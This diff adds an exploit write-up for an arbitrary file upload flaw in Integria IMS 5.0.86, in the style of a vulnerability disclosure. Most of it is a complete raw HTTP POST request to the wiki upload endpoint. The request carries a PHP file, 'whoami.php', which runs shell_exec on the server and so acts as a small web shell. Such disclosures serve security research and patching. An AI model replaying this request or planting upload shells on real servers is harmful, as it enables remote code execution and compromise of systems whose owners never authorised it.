@@ -1,0 +1,45 @@
+# Exploit Title: Integria IMS 5.0.86 - Arbitrary File Upload
+# Date: 2019-08-16
+# Exploit Author: Greg.Priest
+# Vendor Homepage: https://integriaims.com/
+# Software Link: https://sourceforge.net/projects/integria/files/5.0.86/
+# Version: Integria IMS 5.0.86
+# Tested on: Windows
+# CVE : N/A
+
+# ---------------------------------------------------------------------------------------
+# http://10.61.184.30/integria//index.php?sec=wiki&sec2=operation/wiki/wiki&action=upload
+# ---------------------------------------------------------------------------------------
+
+# [Description]
+# filemgr.php in Integria IMS 5.0.86, allows arbitrary file upload.
+# index.php?sec=wiki&sec2=operation/wiki/wiki&action=upload
+# ---------------------------------------------------------------------------------------
+
+POST /integria/index.php?sec=wiki&sec2=operation/wiki/wiki&action=upload HTTP/1.1
+Host: 10.61.184.30
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: hu-HU,hu;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://10.61.184.30/integria/index.php?sec=wiki&sec2=operation/wiki/wiki&action=upload
+Content-Type: multipart/form-data; boundary=---------------------------30333176734664
+Content-Length: 374
+Connection: close
+Cookie: PHPSESSID=1d31d410e9b85f1e9aaa53a2616a550e
+Upgrade-Insecure-Requests: 1
+
+-----------------------------30333176734664
+Content-Disposition: form-data; name="curdir"
+
+
+-----------------------------30333176734664
+Content-Disposition: form-data; name="file"; filename="whoami.php"
+Content-Type: application/octet-stream
+
+<?php
+$output = shell_exec('whoami');
+echo "<pre>$output</pre>";
+?>
+
+-----------------------------30333176734664--
